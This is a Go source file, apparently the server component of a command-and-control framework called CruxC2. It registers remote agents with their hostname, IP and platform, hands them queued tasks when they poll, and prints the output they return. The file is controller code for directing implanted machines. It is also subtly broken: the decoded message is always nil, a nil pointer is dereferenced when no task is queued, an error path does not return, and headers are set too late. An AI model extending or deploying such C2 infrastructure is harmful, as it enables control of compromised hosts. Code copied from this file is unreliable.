package server

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"time"

	"github.com/RandomChugokujin/CruxC2/internal/protocol"
	"github.com/RandomChugokujin/CruxC2/internal/sessions"
	"github.com/RandomChugokujin/CruxC2/internal/tasks"
)

type C2 struct {
	sessions sessions.SessionManager
}

func NewC2(sessions sessions.SessionManager) *C2 {
    return &C2{sessions: sessions}
}

func (c *C2) List() []*sessions.Session {
	return c.sessions.List()
}

func SendResponse(w http.ResponseWriter, msg any, agent_id string) error {
	response_payload, err := json.Marshal(msg)
	if err != nil {
		return errors.New("Payload mashalling failure") }
	response_env, err := protocol.NewEnvelope(agent_id, response_payload)
	if err != nil {
		return errors.New("Envelope creation failure")
	}
	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response_env); err != nil {
		return errors.New("Envelope encoding failure")
	}
	return nil
}

func DecodeRequest(r *http.Request, msg_type string) (env protocol.Envelope, msg any, err error) {
	var request_env protocol.Envelope
	if err := json.NewDecoder(r.Body).Decode(&request_env); err != nil {
		return request_env, nil, err
	}

	if request_env.Type != msg_type {
		return request_env, nil, err
	}
	// Unmarshalling payload message
	switch request_env.Type{
	case "MsgAgentRegister":
		var msg protocol.MsgAgentRegister
		if err := json.Unmarshal(request_env.Payload, &msg); err != nil {
			return request_env, nil, err
		}
	case "MsgTaskPoll":
		var msg protocol.MsgTaskPoll
		if err := json.Unmarshal(request_env.Payload, &msg); err != nil {
			return request_env, nil, err
		}
	case "MsgTaskResult":
		var msg protocol.MsgTaskResult
		if err := json.Unmarshal(request_env.Payload, &msg); err != nil {
			return request_env, nil, err
		}
	default:
		e := fmt.Sprintf("Unexpected message type: %s\n", request_env.Type)
		return request_env, nil, errors.New(e)
	}
	return request_env, msg, nil
}


func (c *C2) TaskPoll(w http.ResponseWriter, r *http.Request) {
	request_env, _, err := DecodeRequest(r, "MsgTaskPoll")
	if err != nil {
		error_str := fmt.Sprintf("Error while decoding request: %v", err)
		http.Error(w, error_str, http.StatusBadRequest)
		return
	}

	var task_to_send *tasks.Task
	if agent_session, ok := c.sessions.Get(request_env.AgentID); ok {
		// Update Last poll time
		agent_session.LastPoll = time.Now()
		// Pop a task
		task_to_send, ok = c.sessions.UnqueueTask(agent_session.AgentID)
		if !ok {
			error_str := fmt.Sprintf("Failure fetching tasks for registered agent %s", request_env.AgentID)
			http.Error(w, error_str, http.StatusInternalServerError)
			return
		}
		// No task to send
		if task_to_send == nil {
			*task_to_send = tasks.NewTask(tasks.TaskNone, nil)
		}
	} else {
		// Tell Agent to register
		*task_to_send = tasks.NewTask(tasks.TaskRegister, nil)
	}
	// Response
	msg := protocol.MsgTaskAssign{
		TaskID: task_to_send.TaskID,
		TaskType: task_to_send.TaskType,
		Params: task_to_send.Params,
	}
	// Enveloping and sending payload
	if err := SendResponse(w, &msg, request_env.AgentID); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
}

func (c *C2) TaskSubmit(w http.ResponseWriter, r *http.Request) {
	request_env, request_msg, err := DecodeRequest(r, "MsgTaskResult")
	if err != nil {
		error_str := fmt.Sprintf("Error while decoding request: %v", err)
		http.Error(w, error_str, http.StatusBadRequest)
		return
	}
	request_payload, ok := request_msg.(protocol.MsgTaskResult)
	if !ok {
		http.Error(w, "Error while decoding request: Message type assertion failure", http.StatusBadRequest)
		return
	}
	// check if session is registered
	agent_session, ok := c.sessions.Get(request_env.AgentID)
	if !ok {
		error_str := fmt.Sprintf("Agent %s submitting task is not registered", request_env.AgentID)
		http.Error(w, error_str, http.StatusForbidden)
	}

	if task,ok := c.sessions.FinishTask(agent_session.AgentID, request_payload.TaskID); ok{
		fmt.Println("[TASK REPORT]")
		fmt.Printf("Task Details:\n%s\n", task.String())
		fmt.Printf("Task Output:\n%s\n", request_payload.TaskOutput)
	} else {
		http.Error(w, "Error while submitting task result, ", http.StatusBadRequest)
		return
	}
	msg := protocol.MsgTaskResultAck {
		TaskID: request_payload.TaskID,
	}
	if err := SendResponse(w, msg, request_env.AgentID); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
}

func (c *C2) Register(w http.ResponseWriter, r *http.Request) {
	request_env, request_msg, err := DecodeRequest(r, "MsgAgentRegister")
	if err != nil {
		error_str := fmt.Sprintf("Error while decoding request: %v", err)
		http.Error(w, error_str, http.StatusBadRequest)
		return
	}
	request_payload, ok := request_msg.(protocol.MsgAgentRegister)
	if !ok {
		http.Error(w, "Error while decoding request: Message type assertion failure", http.StatusBadRequest)
		return
	}
	// TODO: Verify agent cryptographic signature before register
	// Register Agent
	register_timestamp := time.Now()
	new_session := &sessions.Session {
		Hostname: request_payload.Hostname,
		AgentID: request_env.AgentID,
		IPAddr: r.RemoteAddr,
		Version: request_payload.AgentVersion,
		Platform: request_payload.Platform,
		Architecture: request_payload.Architecture,
		RegisterTime: register_timestamp,
		LastPoll: register_timestamp,
	}
	agent_registered := c.sessions.Add(new_session)
	// Response
	msg := protocol.MsgAgentRegisterAck{
		AgentRegistered: agent_registered,
	}
	// Enveloping and sending message
	if err := SendResponse(w, msg, request_env.AgentID); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
}
